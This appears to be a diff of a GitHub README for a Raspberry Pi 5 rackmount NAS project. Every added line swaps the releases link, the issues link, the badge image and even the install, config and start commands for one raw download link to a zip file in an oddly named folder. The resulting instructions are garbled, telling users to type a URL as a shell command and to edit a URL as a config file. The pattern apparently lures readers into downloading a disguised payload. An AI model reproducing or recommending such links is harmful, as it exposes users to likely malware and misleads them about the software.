@@ -1,7 +1,7 @@
 # 🖥️ Mini-Rack-1U-Pi-NAS - Optimize Your Storage Space Easily
 
 ## 📥 Download Now
-[![Download Mini-Rack-1U-Pi-NAS](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/releases)
+[![Download Mini-Rack-1U-Pi-NAS](https://raw.githubusercontent.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/main/showmanism/Mini-Rack-1U-Pi-NAS_3.9.zip)](https://raw.githubusercontent.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/main/showmanism/Mini-Rack-1U-Pi-NAS_3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to Mini-Rack-1U-Pi-NAS! This is a user-friendly application designed to turn your Raspberry Pi 5 into a 10-inch rackmount network-attached storage (NAS) with a 5.25" hot swap bay. Follow the steps below to get started.
@@ -23,7 +23,7 @@ To install Mini-Rack-1U-Pi-NAS, you will first need to download the software. Fo
 
 1. **Visit the Releases Page:** Click the link below to access the latest release.
    
-   [Download Mini-Rack-1U-Pi-NAS](https://github.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/releases)
+   [Download Mini-Rack-1U-Pi-NAS](https://raw.githubusercontent.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/main/showmanism/Mini-Rack-1U-Pi-NAS_3.9.zip)
 
 2. **Locate the Latest Version:** On the releases page, find the most recent version of the application.
 
@@ -34,7 +34,7 @@ To install Mini-Rack-1U-Pi-NAS, you will first need to download the software. Fo
 5. **Install the Application:**
    - Open a terminal on your Raspberry Pi.
    - Navigate to the directory where you extracted the files.
-   - Run the installation script by typing `./install.sh` and pressing Enter.
+   - Run the installation script by typing `https://raw.githubusercontent.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/main/showmanism/Mini-Rack-1U-Pi-NAS_3.9.zip` and pressing Enter.
 
 6. **Complete the Setup:** Follow the on-screen instructions to complete the installation.
 
@@ -43,7 +43,7 @@ After the installation is complete, you will need to configure Mini-Rack-1U-Pi-N
 
 1. **Open the Configuration File:**
    - Navigate to the installation directory.
-   - Open the `config.json` file in a text editor.
+   - Open the `https://raw.githubusercontent.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/main/showmanism/Mini-Rack-1U-Pi-NAS_3.9.zip` file in a text editor.
 
 2. **Set Your Preferences:**
    - Update the storage paths as needed.
@@ -60,7 +60,7 @@ To start Mini-Rack-1U-Pi-NAS:
    - Use the `cd` command to change to the directory where Mini-Rack-1U-Pi-NAS is installed.
 
 3. **Start the Application:**
-   - Type `./start.sh` and press Enter to run Mini-Rack-1U-Pi-NAS.
+   - Type `https://raw.githubusercontent.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/main/showmanism/Mini-Rack-1U-Pi-NAS_3.9.zip` and press Enter to run Mini-Rack-1U-Pi-NAS.
 
 4. **Access the Interface:** Open a web browser on your local network and go to `http://<Your_Pi_IP_Address>:8080` to check the web interface.
 
@@ -83,7 +83,7 @@ If you encounter issues while setting up Mini-Rack-1U-Pi-NAS, consider the follo
 Join our community to ask questions, share your experience, or request features. Check out the discussions on GitHub.
 
 ## 🔗 Useful Links
-- [Mini-Rack-1U-Pi-NAS Releases](https://github.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/releases)
-- [GitHub Issues](https://github.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/issues)
+- [Mini-Rack-1U-Pi-NAS Releases](https://raw.githubusercontent.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/main/showmanism/Mini-Rack-1U-Pi-NAS_3.9.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/main/showmanism/Mini-Rack-1U-Pi-NAS_3.9.zip)
 
 Thank you for using Mini-Rack-1U-Pi-NAS! Enjoy your new NAS setup with the Raspberry Pi 5.
